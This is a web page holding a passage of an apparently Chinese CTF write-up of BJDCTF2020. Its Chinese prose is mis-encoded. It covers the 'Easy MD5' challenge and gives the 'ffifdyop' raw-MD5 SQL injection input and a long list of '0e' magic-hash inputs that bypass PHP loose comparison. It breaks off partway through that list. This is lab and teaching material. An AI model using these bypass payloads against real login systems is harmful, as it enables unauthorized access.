<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="BJDCTF2020 wp åœ¨buuojä¸Šé¢å¤ç°çš„wpï¼Œæœ‰ä¸€äº›æ˜¯è‡ªå·±åšå‡ºæ¥çš„ï¼Œæœ‰ä¸€äº›æ˜¯çœ‹äº†wpæ‰åšå‡ºæ¥äº†ï¼Œä¾ç„¶å¾ˆèœã€‚\nEasy MD5 æ‰“å¼€ç½‘å€ä¹‹åï¼Œåœ¨å“åº”æ ‡å¤´ä¸­æ‰¾åˆ°äº†hintï¼š\n1 select * from 'admin' where password = md5($pass,true) ç†è®ºä¸Šmd5çš„å¯†ç éªŒè¯æ˜¯å¾ˆéš¾ç ´è§£çš„ï¼Œä½†æ˜¯è¿™é‡ŒMD5å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°è®¾ä¸ºtrueå°±æœ‰æ¼æ´ã€‚\n1 2 3 4 md5(&#34;hello&#34;); >>5d41402abc4b2a76b9719d911017c592 md5(&#34;hello&#34;,true); >>]A@*ï¿½K*vï¿½qï¿½ï¿½\x10\x17Å’ 32å­—ç¬¦åå…­è¿›åˆ¶æ•°å¾ˆå¥½ç†è§£ï¼Œ16è¿›åˆ¶å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼å¹¶éçœŸçš„äºŒè¿›åˆ¶ï¼ŒäºŒåå°†åå…­è¿›åˆ¶æ•°ä¸¤ä¸ªä¸€ç»„ï¼Œè½¬åŒ–æˆASCIIå­—ç¬¦ï¼Œå¦‚ï¼Œ5d =ã€‹],41=>A\nå› æ­¤å¯ä»¥è¾“å…¥ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œä½¿å¾—md5ä¹‹åçš„raw_outputä¸­å«æœ‰orã€‚ç½‘ä¸Šæ‰¾åˆ°äº†ä¸¤ä¸ªï¼š\n1 2 3 4 5 md5(&#34;ffifdyop&#34;,true); >>'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b\x1c md5(&#34;129581926211651571912466741651878684928&#34;,true); >>\x06ï¿½T0Dï¿½ï¿½o#ï¿½ï¿½'or'8 //ç¬¬äºŒä¸ªåœ¨è¯¥é¢˜ä¸­æ— æ•ˆ ç¬¬äºŒå±‚æ˜¯MD5ç¢°æ’ï¼š\n1 2 3 4 5 6 7 <!-- $a = $GET['a']; $b = $_GET['b']; if($a != $b && md5($a) == md5($b)){ // wow, glzjin wants a girl friend. --> å› ä¸ºä½¿ç”¨çš„æ˜¯!=å’Œ==å¼±ç±»å‹æ¯”è¾ƒè€Œä¸æ˜¯ï¼==å’Œ===è¿™ç§å¼ºç±»å‹æ¯”è¾ƒï¼Œå¼±ç±»å‹æ¯”è¾ƒä¼šå°†â€˜0Eâ€™å¼€å¤´çš„å“ˆå¸Œå€¼è§£é‡Šä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚\n"><title>BJDCTF2020</title><link rel=canonical href=https://k1te.cn/p/bjdctf2020/><link rel=stylesheet href=/scss/style.min.b0e76e98cdd4f7082d1fc36f7af7e0843a81201db2197c03ca426751dc923735.css><meta property='og:title' content="BJDCTF2020"><meta property='og:description' content="BJDCTF2020 wp åœ¨buuojä¸Šé¢å¤ç°çš„wpï¼Œæœ‰ä¸€äº›æ˜¯è‡ªå·±åšå‡ºæ¥çš„ï¼Œæœ‰ä¸€äº›æ˜¯çœ‹äº†wpæ‰åšå‡ºæ¥äº†ï¼Œä¾ç„¶å¾ˆèœã€‚\nEasy MD5 æ‰“å¼€ç½‘å€ä¹‹åï¼Œåœ¨å“åº”æ ‡å¤´ä¸­æ‰¾åˆ°äº†hintï¼š\n1 select * from 'admin' where password = md5($pass,true) ç†è®ºä¸Šmd5çš„å¯†ç éªŒè¯æ˜¯å¾ˆéš¾ç ´è§£çš„ï¼Œä½†æ˜¯è¿™é‡ŒMD5å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°è®¾ä¸ºtrueå°±æœ‰æ¼æ´ã€‚\n1 2 3 4 md5(&#34;hello&#34;); >>5d41402abc4b2a76b9719d911017c592 md5(&#34;hello&#34;,true); >>]A@*ï¿½K*vï¿½qï¿½ï¿½\x10\x17Å’ 32å­—ç¬¦åå…­è¿›åˆ¶æ•°å¾ˆå¥½ç†è§£ï¼Œ16è¿›åˆ¶å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼å¹¶éçœŸçš„äºŒè¿›åˆ¶ï¼ŒäºŒåå°†åå…­è¿›åˆ¶æ•°ä¸¤ä¸ªä¸€ç»„ï¼Œè½¬åŒ–æˆASCIIå­—ç¬¦ï¼Œå¦‚ï¼Œ5d =ã€‹],41=>A\nå› æ­¤å¯ä»¥è¾“å…¥ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œä½¿å¾—md5ä¹‹åçš„raw_outputä¸­å«æœ‰orã€‚ç½‘ä¸Šæ‰¾åˆ°äº†ä¸¤ä¸ªï¼š\n1 2 3 4 5 md5(&#34;ffifdyop&#34;,true); >>'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b\x1c md5(&#34;129581926211651571912466741651878684928&#34;,true); >>\x06ï¿½T0Dï¿½ï¿½o#ï¿½ï¿½'or'8 //ç¬¬äºŒä¸ªåœ¨è¯¥é¢˜ä¸­æ— æ•ˆ ç¬¬äºŒå±‚æ˜¯MD5ç¢°æ’ï¼š\n1 2 3 4 5 6 7 <!-- $a = $GET['a']; $b = $_GET['b']; if($a != $b && md5($a) == md5($b)){ // wow, glzjin wants a girl friend. --> å› ä¸ºä½¿ç”¨çš„æ˜¯!=å’Œ==å¼±ç±»å‹æ¯”è¾ƒè€Œä¸æ˜¯ï¼==å’Œ===è¿™ç§å¼ºç±»å‹æ¯”è¾ƒï¼Œå¼±ç±»å‹æ¯”è¾ƒä¼šå°†â€˜0Eâ€™å¼€å¤´çš„å“ˆå¸Œå€¼è§£é‡Šä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚\n"><meta property='og:url' content='https://k1te.cn/p/bjdctf2020/'><meta property='og:site_name' content><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='wp'><meta property='article:tag' content='ctf'><meta property='article:published_time' content='2020-09-28T14:42:08+08:00'><meta property='article:modified_time' content='2020-09-28T14:42:08+08:00'><meta name=twitter:title content="BJDCTF2020"><meta name=twitter:description content="BJDCTF2020 wp åœ¨buuojä¸Šé¢å¤ç°çš„wpï¼Œæœ‰ä¸€äº›æ˜¯è‡ªå·±åšå‡ºæ¥çš„ï¼Œæœ‰ä¸€äº›æ˜¯çœ‹äº†wpæ‰åšå‡ºæ¥äº†ï¼Œä¾ç„¶å¾ˆèœã€‚\nEasy MD5 æ‰“å¼€ç½‘å€ä¹‹åï¼Œåœ¨å“åº”æ ‡å¤´ä¸­æ‰¾åˆ°äº†hintï¼š\n1 select * from 'admin' where password = md5($pass,true) ç†è®ºä¸Šmd5çš„å¯†ç éªŒè¯æ˜¯å¾ˆéš¾ç ´è§£çš„ï¼Œä½†æ˜¯è¿™é‡ŒMD5å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°è®¾ä¸ºtrueå°±æœ‰æ¼æ´ã€‚\n1 2 3 4 md5(&#34;hello&#34;); >>5d41402abc4b2a76b9719d911017c592 md5(&#34;hello&#34;,true); >>]A@*ï¿½K*vï¿½qï¿½ï¿½\x10\x17Å’ 32å­—ç¬¦åå…­è¿›åˆ¶æ•°å¾ˆå¥½ç†è§£ï¼Œ16è¿›åˆ¶å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼å¹¶éçœŸçš„äºŒè¿›åˆ¶ï¼ŒäºŒåå°†åå…­è¿›åˆ¶æ•°ä¸¤ä¸ªä¸€ç»„ï¼Œè½¬åŒ–æˆASCIIå­—ç¬¦ï¼Œå¦‚ï¼Œ5d =ã€‹],41=>A\nå› æ­¤å¯ä»¥è¾“å…¥ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œä½¿å¾—md5ä¹‹åçš„raw_outputä¸­å«æœ‰orã€‚ç½‘ä¸Šæ‰¾åˆ°äº†ä¸¤ä¸ªï¼š\n1 2 3 4 5 md5(&#34;ffifdyop&#34;,true); >>'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b\x1c md5(&#34;129581926211651571912466741651878684928&#34;,true); >>\x06ï¿½T0Dï¿½ï¿½o#ï¿½ï¿½'or'8 //ç¬¬äºŒä¸ªåœ¨è¯¥é¢˜ä¸­æ— æ•ˆ ç¬¬äºŒå±‚æ˜¯MD5ç¢°æ’ï¼š\n1 2 3 4 5 6 7 <!-- $a = $GET['a']; $b = $_GET['b']; if($a != $b && md5($a) == md5($b)){ // wow, glzjin wants a girl friend. --> å› ä¸ºä½¿ç”¨çš„æ˜¯!=å’Œ==å¼±ç±»å‹æ¯”è¾ƒè€Œä¸æ˜¯ï¼==å’Œ===è¿™ç§å¼ºç±»å‹æ¯”è¾ƒï¼Œå¼±ç±»å‹æ¯”è¾ƒä¼šå°†â€˜0Eâ€™å¼€å¤´çš„å“ˆå¸Œå€¼è§£é‡Šä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_2a444350afcc48e2.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>ğŸ¯</span></figure><div class=site-meta><h1 class=site-name><a href=/></a></h1><h2 class=site-description>Whereof one cannot speak, thereof one must be silent.</h2></div></header><ol class=menu-social><li><a href=https://github.com/zk1te target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#easy-md5>Easy MD5</a></li><li><a href=#mark-loves-cat>Mark loves cat</a></li><li><a href=#zjctfä¸è¿‡å¦‚æ­¤>ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</a></li><li><a href=#easysearch>EasySearch</a></li><li><a href=#cookie-is-so-stable>Cookie is so stable</a></li><li><a href=#ezphp>EzPHP</a></li><li><a href=#the-mystery-of-ip>The mystery of ip</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E9%A2%98%E8%A7%A3/>é¢˜è§£</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/bjdctf2020/>BJDCTF2020</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2020-09-28T14:42:08+08:00>Sep 28, 2020</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>5 minute read</time></div></footer></div></header><section class=article-content><h1 id=bjdctf2020-wp>BJDCTF2020 wp</h1><p>åœ¨buuojä¸Šé¢å¤ç°çš„wpï¼Œæœ‰ä¸€äº›æ˜¯è‡ªå·±åšå‡ºæ¥çš„ï¼Œæœ‰ä¸€äº›æ˜¯çœ‹äº†wpæ‰åšå‡ºæ¥äº†ï¼Œä¾ç„¶å¾ˆèœã€‚</p><h2 id=easy-md5>Easy MD5</h2><p>æ‰“å¼€ç½‘å€ä¹‹åï¼Œåœ¨å“åº”æ ‡å¤´ä¸­æ‰¾åˆ°äº†hintï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20200928144459500.png loading=lazy></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=s1>&#39;admin&#39;</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nf>md5</span><span class=p>(</span><span class=err>$</span><span class=n>pass</span><span class=p>,</span><span class=no>true</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>ç†è®ºä¸Šmd5çš„å¯†ç éªŒè¯æ˜¯å¾ˆéš¾ç ´è§£çš„ï¼Œä½†æ˜¯è¿™é‡ŒMD5å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°è®¾ä¸ºtrueå°±æœ‰æ¼æ´ã€‚</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20200928150534381.png loading=lazy></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>md5</span><span class=p>(</span><span class=s2>&#34;hello&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span><span class=mi>5</span><span class=nx>d41402abc4b2a76b9719d911017c592</span>
</span></span><span class=line><span class=cl><span class=nx>md5</span><span class=p>(</span><span class=s2>&#34;hello&#34;</span><span class=p>,</span><span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span><span class=p>]</span><span class=nx>A</span><span class=o>@*</span><span class=nx>ï¿½K</span><span class=o>*</span><span class=nx>vï¿½qï¿½ï¿½</span><span class=err></span><span class=nx>Å’</span>
</span></span></code></pre></td></tr></table></div></div><p>32å­—ç¬¦åå…­è¿›åˆ¶æ•°å¾ˆå¥½ç†è§£ï¼Œ16è¿›åˆ¶å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼å¹¶éçœŸçš„äºŒè¿›åˆ¶ï¼ŒäºŒåå°†åå…­è¿›åˆ¶æ•°ä¸¤ä¸ªä¸€ç»„ï¼Œè½¬åŒ–æˆASCIIå­—ç¬¦ï¼Œå¦‚ï¼Œ5d =ã€‹<code>]</code>,41=><code>A</code></p><p>å› æ­¤å¯ä»¥è¾“å…¥ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œä½¿å¾—md5ä¹‹åçš„raw_outputä¸­å«æœ‰<code>or</code>ã€‚ç½‘ä¸Šæ‰¾åˆ°äº†ä¸¤ä¸ªï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>md5</span><span class=p>(</span><span class=s2>&#34;ffifdyop&#34;</span><span class=p>,</span><span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span><span class=s1>&#39;or&#39;</span><span class=mi>6</span><span class=nx>ï¿½</span><span class=p>]</span><span class=nx>ï¿½ï¿½</span><span class=o>!</span><span class=nx>r</span><span class=p>,</span><span class=nx>ï¿½ï¿½b</span><span class=err></span>
</span></span><span class=line><span class=cl><span class=nx>md5</span><span class=p>(</span><span class=s2>&#34;129581926211651571912466741651878684928&#34;</span><span class=p>,</span><span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span><span class=err></span><span class=nx>ï¿½T0Dï¿½ï¿½o</span><span class=c1>#ï¿½ï¿½&#39;or&#39;8
</span></span></span><span class=line><span class=cl><span class=c1>//ç¬¬äºŒä¸ªåœ¨è¯¥é¢˜ä¸­æ— æ•ˆ
</span></span></span></code></pre></td></tr></table></div></div><p>ç¬¬äºŒå±‚æ˜¯MD5ç¢°æ’ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20200928151554272.png loading=lazy></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!--
</span></span></span><span class=line><span class=cl><span class=c>$a = $GET[&#39;a&#39;];
</span></span></span><span class=line><span class=cl><span class=c>$b = $_GET[&#39;b&#39;];
</span></span></span><span class=line><span class=cl><span class=c>
</span></span></span><span class=line><span class=cl><span class=c>if($a != $b &amp;&amp; md5($a) == md5($b)){
</span></span></span><span class=line><span class=cl><span class=c>    // wow, glzjin wants a girl friend.
</span></span></span><span class=line><span class=cl><span class=c>--&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>å› ä¸ºä½¿ç”¨çš„æ˜¯<code>!=</code>å’Œ<code>==</code>å¼±ç±»å‹æ¯”è¾ƒè€Œä¸æ˜¯<code>ï¼==</code>å’Œ<code>===</code>è¿™ç§å¼ºç±»å‹æ¯”è¾ƒï¼Œå¼±ç±»å‹æ¯”è¾ƒä¼šå°†â€˜0Eâ€™å¼€å¤´çš„å“ˆå¸Œå€¼è§£é‡Šä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p><p>ç¬¦åˆæ¡ä»¶çš„ä¸€äº›MD5å€¼ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>çº¯æ•°å­—ç±»ï¼š
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>s878926199a
</span></span><span class=line><span class=cl>0e545993274517709034328855841020
</span></span><span class=line><span class=cl>s155964671a
</span></span><span class=line><span class=cl>0e342768416822451524974117254469
</span></span><span class=line><span class=cl>s214587387a
</span></span><span class=line><span class=cl>0e848240448830537924465865611904
</span></span><span class=line><span class=cl>s214587387a
</span></span><span class=line><span class=cl>0e848240448830537924465865611904
</span></span><span class=line><span class=cl>s878926199a
</span></span><span class=line><span class=cl>0e545993274517709034328855841020
</span></span><span class=line><span class=cl>s1091221200a
</span></span><span class=line><span class=cl>0e940624217856561557816327384675
</span></span><span class=line><span class=cl>s1885207154a
</span></span><span class=line><span class=cl>0e509367213418206700842008763514
</span></span><span class=line><span class=cl>s1502113478a
</span></span><span class=line><span class=cl>0e861580163291561247404381396064
</span></span><span class=line><span class=cl>s1885207154a
</span></span><span class=line><span class=cl>0e509367213418206700842008763514
</span></span><span class=line><span class=cl>s1836677006a
</span></span><span class=line><span class=cl>0e481036490867661113260034900752
</span></span><span class=line><span class=cl>s155964671a
</span></span><span class=line><span class=cl>0e342768416822451524974117254469
</span></span><span class=line><span class=cl>s1184209335a
</span></span><span class=line><span class=cl>0e072485820392773389523109082030
</span></span><span class=line><span class=cl>s1665632922a
</span></span><span class=line><span class=cl>0e731198061491163073197128363787
</span></span><span class=line><span class=cl>s1502113478a
</span></span><span class=line><span class=cl>0e861580163291561247404381396064
</span></span><span class=line><span class=cl>s1836677006a
</span></span><span class=line><span class=cl>0e481036490867661113260034900752
</span></span><span class=line><span class=cl>s1091221200a
</span></span><span class=line><span class=cl>0e940624217856561557816327384675
</span></span><span class=line><span class=cl>s155964671a
</span></span><span class=line><span class=cl>0e342768416822451524974117254469
</span></span><span class=line><span class=cl>s1502113478a
</span></span><span class=line><span class=cl>0e861580163291561247404381396064
</span></span><span class=line><span class=cl>s155964671a
</span></span><span class=line><span class=cl>0e342768416822451524974117254469
</span></span><span class=line><span class=cl>s1665632922a
</span></span><span class=line><span class=cl>0e731198061491163073197128363787
</span></span><span class=line><span class=cl>s155964671a
</span></span><span class=line><span class=cl>0e342768416822451524974117254469
</span></span><span class=line><span class=cl>s1091221200a
</span></span><span class=line><span class=cl>0e940624217856561557816327384675
</span></span><span class=line><span class=cl>s1836677006a
</span></span><span class=line><span class=cl>0e481036490867661113260034900752
</span></span><span class=line><span class=cl>s1885207154a
